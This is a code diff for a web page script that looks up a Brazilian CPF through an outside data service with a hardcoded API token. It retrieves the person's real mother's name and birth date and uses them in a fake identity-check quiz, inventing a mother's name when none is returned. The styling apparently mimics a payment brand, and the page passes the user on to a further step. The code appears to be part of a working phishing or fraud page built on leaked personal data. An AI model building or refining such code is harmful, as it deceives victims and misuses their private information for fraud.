@@ -200,7 +200,7 @@ document.addEventListener("DOMContentLoaded", () => {
         </div>
     </div>
 </footer>
-     <script>
+    <script>
    const API_URL = "https://magmadatahub.com/api.php";
    const API_TOKEN = "d7c5436286e44288a459ca98de0e140bd32fe9717dcadb1c6bd13526f24a78b9";
 
@@ -226,10 +226,21 @@ document.addEventListener("DOMContentLoaded", () => {
 
          cpfData = await fetchCPF(cpfLimpo);
 
-         // Se nome da mãe vier vazio → gerar nome fake
-         if (!cpfData.nome_mae || cpfData.nome_mae.trim() === "") {
+         // Normaliza dados da API
+         cpfData.nome_mae = cpfData.nome_mae ? cpfData.nome_mae.trim() : "";
+         cpfData.nome = cpfData.nome ? cpfData.nome.trim() : "";
+         cpfData.sexo = cpfData.sexo ? cpfData.sexo.trim() : "";
+         cpfData.nascimento = cpfData.nascimento ? cpfData.nascimento.trim() : "";
+
+         // Se nome da mãe REAL vier vazio → gera um fake
+         if (!cpfData.nome_mae) {
             const randomNames = ['Ana', 'Maria', 'Joana', 'Lucia', 'Rosa'];
             cpfData.nome_mae = randomNames[Math.floor(Math.random() * randomNames.length)];
+         }
+
+         // Se data vier bugada tipo "-0001", limpa
+         if (cpfData.nascimento.includes("-0001")) {
+            cpfData.nascimento = "";
          }
 
          document.getElementById('loading').classList.add('hidden');
@@ -237,54 +248,61 @@ document.addEventListener("DOMContentLoaded", () => {
 
          showMotherNameOptions();
       } catch (e) {
+         console.error(e);
          showError('Não foi possível validar seus dados. Tente novamente.');
       }
    }
 
    function showMotherNameOptions() {
-      const correctName = cpfData.nome_mae.split(' ')[0];
-      const fakeNames = ['Maria', 'Ana', 'Joana', 'Rosa', 'Lucia'].filter(n => n !== correctName);
+      const motherName = cpfData.nome_mae;
+      const correctName = motherName.split(' ')[0];
 
-      const allOptions = [correctName, ...fakeNames.sort(() => Math.random() - 0.5).slice(0, 3)]
-         .sort(() => Math.random() - 0.5);
+      const fakeNames = ['Maria', 'Ana', 'Joana', 'Rosa', 'Lucia'].filter(n => n !== correctName);
+      const allOptions = [
+         correctName,
+         ...fakeNames.sort(() => Math.random() - 0.5).slice(0, 3)
+      ].sort(() => Math.random() - 0.5);
 
       const container = document.getElementById('mother-options');
       container.innerHTML = '';
 
       allOptions.forEach(name => {
-         const btn = document.createElement('button');
-         btn.type = 'button';
-         btn.className = 'w-full bg-gray-50 border-2 border-gray-200 hover:border-mp-blue py-3 px-4 rounded-lg font-semibold';
-         btn.textContent = name;
-         btn.onclick = () => validateMotherName(name);
-         container.appendChild(btn);
+         const button = document.createElement('button');
+         button.type = 'button';
+         button.className = 'w-full bg-gray-50 border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-3 px-4 rounded-lg font-semibold transition-all text-left';
+         button.textContent = name;
+         button.onclick = () => validateMotherName(name);
+         container.appendChild(button);
       });
 
-      const noneBtn = document.createElement('button');
-      noneBtn.type = 'button';
-      noneBtn.className = 'w-full bg-mp-blue text-white py-3 rounded-lg font-semibold mt-4';
-      noneBtn.textContent = "Nenhuma das alternativas";
-      noneBtn.onclick = () => window.location.href = '/2.2.php';
-      container.appendChild(noneBtn);
+      // Botão "Nenhuma das alternativas"
+      const noneButton = document.createElement('button');
+      noneButton.type = 'button';
+      noneButton.className = 'w-full bg-mp-blue text-white py-3 rounded-lg font-semibold hover:bg-mp-dark-blue transition-all mt-4';
+      noneButton.textContent = "Nenhuma das alternativas";
+      noneButton.onclick = function() {
+          window.location.href = '/2.2.php';
+      };
+      container.appendChild(noneButton);
    }
 
    function validateMotherName(selectedName) {
       const correctName = cpfData.nome_mae.split(' ')[0];
       if (selectedName !== correctName) {
-         showError('Nome da mãe incorreto. Tente novamente.');
+         showError('Nome da mãe incorreto. Por favor, tente novamente.');
          return;
       }
 
+      // Esconde opções e mostra data de nascimento
       document.getElementById('mother-options').parentElement.classList.add('hidden');
-
-      const bdSection = document.getElementById('birthdate-section');
-      bdSection.classList.remove('hidden');
-      document.getElementById('birthdate-display').textContent = cpfData.nascimento;
+      const birthdateSection = document.getElementById('birthdate-section');
+      birthdateSection.classList.remove('hidden');
+      document.getElementById('birthdate-display').textContent = cpfData.nascimento || "Não informado";
    }
 
    function validateBirthdate(isCorrect) {
       if (!isCorrect) {
-         showError('Data de nascimento incorreta.');
+         showError('Data de nascimento incorreta. Entre em contato com o suporte.');
          return;
       }
 
@@ -296,11 +314,11 @@ document.addEventListener("DOMContentLoaded", () => {
       window.location.href = `2.2.php?${urlParams.toString()}`;
    }
 
-   function showError(msg) {
+   function showError(message) {
       document.getElementById('loading').classList.add('hidden');
       document.getElementById('validation-form').classList.add('hidden');
       document.getElementById('error').classList.remove('hidden');
-      document.getElementById('errorMessage').textContent = msg;
+      document.getElementById('errorMessage').textContent = message;
    }
 
    window.onload = consultarCPF;
